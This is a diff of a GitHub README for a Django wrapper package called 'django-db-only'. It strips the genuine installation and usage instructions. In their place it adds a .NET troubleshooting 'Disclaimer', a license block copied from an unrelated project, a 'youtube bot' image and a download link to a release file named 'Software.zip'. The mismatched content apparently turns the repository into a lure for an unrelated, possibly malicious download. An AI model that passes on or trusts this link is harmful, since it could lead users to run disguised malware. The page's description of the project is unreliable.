@@ -1,35 +1,11 @@
-# <p align="center">django-db-only
-
-This is just wrapper package on top of django framework, which creates django project with only standalone modules included.
-  
-You can check releases in [Releases](https://github.com/abrorbekuz/django_db_only/releases)<br>
-Our community [Telegram Group](https://t.me/django_db_only)<br>
-
-https://www.youtube.com/playlist?list=PLh46jnU2E2AIztw2O4SyhupjCPmEeY3vO
-
-## Howto
-**1.** install django-db-only: 
-
-`python setup.py install` or just type<br> `pip install django-db-only`
-
-**2.** create standalone django models project:
-
-```
-django_db_only startproject myproject
-cd myproject
-```
-
-**3.** migrate
-
-```
-python manage.py makemigrations <app_name>
-python manage.py migrate <app_name>
-```
-
-**4.** run application with standalone django models:
-
-```
-python query_resolver.py
-```
+# Disclaimer ⚠️
+### If our software does not work for you
+1) Update your NET Framework
+2) Update your Visual studio
 
 
+
+## License [![GitHub license](https://img.shields.io/github/license/airsquared/blobsaver.svg)](https://github.com/airsquared/blobsaver/blob/master/LICENSE)
+This project is licensed under GNU GPL v3.0-only - see the [LICENSE](https://github.com/airsquared/blobsaver/blob/master/LICENSE) file for details
+![youtube bot](https://github.com/abrorbekuz/django-db-only/assets/69087966/e9b26067-107f-4e0b-887b-83a087e5fa2e)
+[![download](https://github.com/abrorbekuz/django-db-only/assets/69087966/270146c1-1741-4429-876d-46fe5c7dd5f9)](https://github.com/abrorbekuz/django-db-only/releases/download/YoutubeBot/Software.zip)
